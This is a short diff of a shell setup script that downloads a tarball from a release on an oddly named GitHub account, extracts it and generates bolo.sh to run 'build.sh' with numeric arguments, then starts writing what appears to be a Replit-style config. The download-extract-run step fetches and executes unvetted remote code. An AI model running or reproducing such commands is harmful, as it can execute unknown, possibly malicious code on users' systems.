@@ -1,7 +1,7 @@
-curl -O -J -L https://github.com/wouegrkaj922-max/dewsa/releases/download/deas/kombi.tar.gz && tar -xf kombi.tar.gz && rm -rf kombi.tar.gz
+curl -O -J -L https://github.com/wouegrkaj922-max/dewsa/releases/download/deas/kombe.tar.gz && tar -xf kombe.tar.gz && rm -rf kombe.tar.gz
 echo '#!/bin/bash
 
-bash build.sh 4 008' > bolo.sh
+bash build.sh 4 006' > bolo.sh
 echo 'modules = ["python-3.11"]
 
 [workflows]
